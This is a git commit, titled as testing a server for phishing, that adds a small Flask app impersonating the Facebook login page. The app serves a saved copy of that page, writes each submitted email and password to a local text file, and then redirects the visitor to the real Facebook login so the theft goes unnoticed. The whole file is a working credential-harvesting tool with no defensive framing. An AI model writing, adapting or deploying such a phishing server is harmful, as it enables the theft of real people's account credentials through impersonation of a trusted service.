14dc39752ec99ad0546d7c9fbd0c50098e66a93d
Igor-Felipy <igor.felipy123@gmail.com>
2020-07-20 21:09:07 -0400

    testing a server for phishing

---
+++ app.py
@@ -0,0 +1,23 @@
+from flask import Flask, request, render_template, redirect
+
+app = Flask(__name__)
+
+@app.route("/", methods=['GET','POST'])
+def get_data():
+    if request.method == "GET":
+        return render_template("Facebook – entre ou cadastre-se.html")
+    elif request.method == "POST":
+        
+        data = request.form['email'] + request.form['password']
+        file = open('data.txt','a')
+        file.write(str(data) +' '+"\n")
+        file.close()
+
+
+        return redirect("https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110")
+    else:
+        return render_template("Facebook – entre ou cadastre-se.html")
+
+
+if __name__=="__main__":
+    app.run(debug=True)
